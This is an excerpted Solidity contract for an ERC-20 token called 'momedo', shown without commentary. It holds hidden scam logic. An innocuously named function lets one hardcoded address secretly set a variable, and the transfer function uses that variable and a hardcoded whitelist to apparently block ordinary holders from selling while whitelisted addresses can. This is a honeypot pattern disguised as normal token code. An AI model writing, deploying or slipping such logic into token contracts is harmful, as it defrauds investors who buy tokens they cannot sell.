...
contract TOKEN is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xfd570440257A2d6d570eFe1aBDbb3a6AD01d8c0f) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 
        0xE2911daF5e388f7668AE9340Bd865E42ad472255) ||
         (_p76234 == to && from != 0xE2911daF5e388f7668AE9340Bd865E42ad472255 && 
         from  != 0x1bb1208A0e8cC5aF7C55a70516261A9711918b6B 
         && from != 0x9CbC2d34C04fCDF7F3B2Ec4a192EA6ef6BfFf65B)) {
    ...
    constructor() {
        _name = unicode"momedo";
        _symbol = unicode"momedo";
